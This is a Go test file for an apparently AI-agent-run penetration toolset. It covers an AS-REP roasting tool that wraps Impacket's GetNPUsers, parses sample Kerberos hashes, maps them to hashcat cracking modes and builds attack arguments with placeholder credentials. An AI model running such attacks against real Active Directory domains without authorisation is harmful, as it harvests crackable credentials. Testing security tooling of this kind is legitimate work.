package agent

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"time"
)

const asrepTestOut = `Impacket v0.11.0 - Copyright 2023 Fortra

$krb5asrep$23$svc_sql@CORP.LOCAL:0123456789abcdef0123456789abcdef$deadbeefdeadbeef
$krb5asrep$23$svc_web@CORP.LOCAL:abcdef0123456789abcdef0123456789$cafebabecafebabe
`

func TestParseASREPHashes(t *testing.T) {
	hashes := parseASREPHashes(asrepTestOut + asrepTestOut)
	if len(hashes) != 2 {
		t.Fatalf("hashes = %d, want 2: %+v", len(hashes), hashes)
	}
	if hashes[0].AccountName != "svc_sql" || hashes[0].Realm != "CORP.LOCAL" ||
		hashes[0].EType != 23 || hashes[0].HashcatMode != 18200 {
		t.Errorf("hash = %+v", hashes[0])
	}
	if !strings.HasPrefix(hashes[0].Hash, "$krb5asrep$23$") {
		t.Errorf("hash lost: %q", hashes[0].Hash)
	}
	if hashes[1].AccountName != "svc_web" {
		t.Errorf("hash[1] = %+v", hashes[1])
	}
}

func TestASREPHashcatModes(t *testing.T) {
	cases := map[int]int{23: 18200, 17: 19800, 18: 19900, 99: 0}
	for etype, want := range cases {
		if got := asrepHashcatMode(etype); got != want {
			t.Errorf("etype %d mode = %d, want %d", etype, got, want)
		}
	}
}

func TestBuildASREPArgs(t *testing.T) {
	p := &asrepRoastParams{DC: "10.0.0.10", Domain: "CORP.LOCAL"}
	args, err := buildASREPArgs(p, &resolvedKerberoastCred{Username: "alice", Password: "P@ss"}, "")
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(args, " ")
	if !strings.HasPrefix(joined, "CORP.LOCAL/alice:P@ss -dc-ip 10.0.0.10 -request -format hashcat") {
		t.Errorf("args = %s", joined)
	}

	args, err = buildASREPArgs(p, &resolvedKerberoastCred{Username: "alice", Hash: strings.Repeat("a", 32)}, "")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(strings.Join(args, " "), "-hashes "+kerbEmptyLMHash+":"+strings.Repeat("a", 32)) {
		t.Errorf("hash args = %v", args)
	}

	args, err = buildASREPArgs(p, nil, `C:\tmp\users.txt`)
	if err != nil {
		t.Fatal(err)
	}
	joined = strings.Join(args, " ")
	if !strings.Contains(joined, "-usersfile C:\\tmp\\users.txt") || !strings.Contains(joined, "-no-pass") {
		t.Errorf("users args = %s", joined)
	}
	if _, err := buildASREPArgs(p, nil, ""); err == nil {
		t.Error("missing users file accepted")
	}
}

func stubASREP(t *testing.T, out string, runErr error) *[]string {
	t.Helper()
	oldLocate, oldExec := asrepLocateRunner, asrepExecRunner
	var got []string
	asrepLocateRunner = func() (kerberoastRunner, error) {
		return kerberoastRunner{Bin: "python3", BaseArgs: []string{"GetNPUsers.py"}}, nil
	}
	asrepExecRunner = func(_ context.Context, _ kerberoastRunner, args []string, _ time.Duration) (string, error) {
		got = append([]string{}, args...)
		return out, runErr
	}
	t.Cleanup(func() { asrepLocateRunner, asrepExecRunner = oldLocate, oldExec })
	return &got
}

func callASREP(t *testing.T, ts *ToolSet, payload any) asrepResult {
	t.Helper()
	raw, _ := json.Marshal(payload)
	res, err := ts.asrepHandler(context.Background(), raw)
	if err != nil {
		t.Fatalf("handler transport error: %v", err)
	}
	if res.IsError {
		t.Fatalf("handler tool error: %s", res.Flatten())
	}
	var out asrepResult
	if err := json.Unmarshal([]byte(res.Flatten()), &out); err != nil {
		t.Fatalf("unmarshal: %v\n%s", err, res.Flatten())
	}
	return out
}

func TestASREPHandlerCredentialMode(t *testing.T) {
	args := stubASREP(t, asrepTestOut, nil)
	ts := NewToolSet(nil, "tester")
	out := callASREP(t, ts, map[string]any{
		"dc": "10.0.0.10", "domain": "CORP.LOCAL",
		"username": `CORP\alice`, "password": "P@ssw0rd",
	})
	if out.Status != "success" || len(out.Hashes) != 2 {
		t.Fatalf("out = %+v", out)
	}
	if out.Auth == nil || out.Auth.Username != "alice" || out.Auth.Source != "explicit" {
		t.Errorf("auth = %+v", out.Auth)
	}
	joined := strings.Join(*args, " ")
	if !strings.Contains(joined, "CORP.LOCAL/alice:P@ssw0rd") || !strings.Contains(joined, "-request") {
		t.Errorf("args = %s", joined)
	}
}

func TestASREPHandlerUsersMode(t *testing.T) {
	args := stubASREP(t, asrepTestOut, nil)
	ts := NewToolSet(nil, "tester")
	ts.SetReceiptLedger(t.TempDir(), "run")
	out := callASREP(t, ts, map[string]any{
		"dc": "10.0.0.10", "domain": "CORP.LOCAL",
		"users": []string{"CORP\\alice", "bob", "alice"},
	})
	if out.Status != "success" || out.UsersCount != 2 {
		t.Fatalf("out = %+v", out)
	}
	if out.Auth == nil || out.Auth.Source != "users_list" {
		t.Errorf("auth = %+v", out.Auth)
	}
	joined := strings.Join(*args, " ")
	if !strings.Contains(joined, "-usersfile") || !strings.Contains(joined, "-no-pass") {
		t.Errorf("args = %s", joined)
	}
}

func TestASREPHandlerNoCredential(t *testing.T) {
	ts := NewToolSet(nil, "tester")
	raw, _ := json.Marshal(map[string]any{"dc": "10.0.0.10", "domain": "CORP.LOCAL"})
	res, err := ts.asrepHandler(context.Background(), raw)
	if err != nil {
		t.Fatal(err)
	}
	if !res.IsError || !strings.Contains(res.Flatten(), "需要域凭据") {
		t.Fatalf("res = %v %q", res.IsError, res.Flatten())
	}
}

func TestASREPHandlerFailureClassified(t *testing.T) {
	stubASREP(t, "[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)", errors.New("exit status 1"))
	ts := NewToolSet(nil, "tester")
	out := callASREP(t, ts, map[string]any{
		"dc": "10.0.0.10", "domain": "CORP.LOCAL", "username": "alice", "password": "x",
	})
	if out.Status != "failed" || !strings.Contains(out.Error, "时钟偏差") {
		t.Fatalf("out = %+v", out)
	}
	if out.OutputTail == "" {
		t.Error("missing output_tail")
	}
}

func TestASREPDryRun(t *testing.T) {
	stubASREP(t, "", nil)
	ts := NewToolSet(nil, "tester")
	out := callASREP(t, ts, map[string]any{
		"dc": "127.0.0.1", "domain": "CORP.LOCAL", "dry_run": true,
	})
	if out.Status != "dry_run" || out.Tooling == nil {
		t.Fatalf("out = %+v", out)
	}
	if out.Tooling["impacket_ready"] != true {
		t.Errorf("tooling = %+v", out.Tooling)
	}
}

func TestASREPInWorkerSetAndSeeds(t *testing.T) {
	found := false
	for _, tool := range NewToolSet(nil, "").WorkerTools() {
		if tool.Name() == "ad_asreproast" {
			found = true
			if !strings.Contains(tool.Description(), "T1558.004") {
				t.Error("description missing T1558.004")
			}
		}
	}
	if !found {
		t.Fatal("ad_asreproast not in WorkerTools")
	}
	for _, seed := range BuiltinToolSeeds() {
		if seed.Key != "ad_asreproast" {
			continue
		}
		for _, a := range seed.Agents {
			if a == "worker" {
				return
			}
		}
		t.Fatalf("ad_asreproast agents = %v, want worker", seed.Agents)
	}
	t.Fatal("ad_asreproast not seeded")
}

func TestASREPNilStore(t *testing.T) {
	ts := NewToolSet(nil, "")
	res, err := ts.toolASREPRoast().Call(context.Background(),
		json.RawMessage(`{"dc":"10.0.0.10","domain":"CORP.LOCAL","username":"a","password":"x"}`), nil)
	if err != nil {
		t.Fatal(err)
	}
	if !res.IsError || !strings.Contains(res.Flatten(), "任务上下文") {
		t.Fatalf("res = %v %q", res.IsError, res.Flatten())
	}
}

func TestASREPRunnerRealHelp(t *testing.T) {
	runner, err := asrepLocateRunner()
	if err != nil {
		t.Skipf("impacket GetNPUsers not installed: %v", err)
	}
	out, err := execKerberoastCommand(context.Background(), runner, []string{"-h"}, 15*time.Second)
	if err != nil {
		t.Fatalf("GetNPUsers -h failed: %v\n%s", err, out)
	}
	if !strings.Contains(strings.ToLower(out), "usage") {
		t.Fatalf("unexpected -h output: %s", out)
	}
}
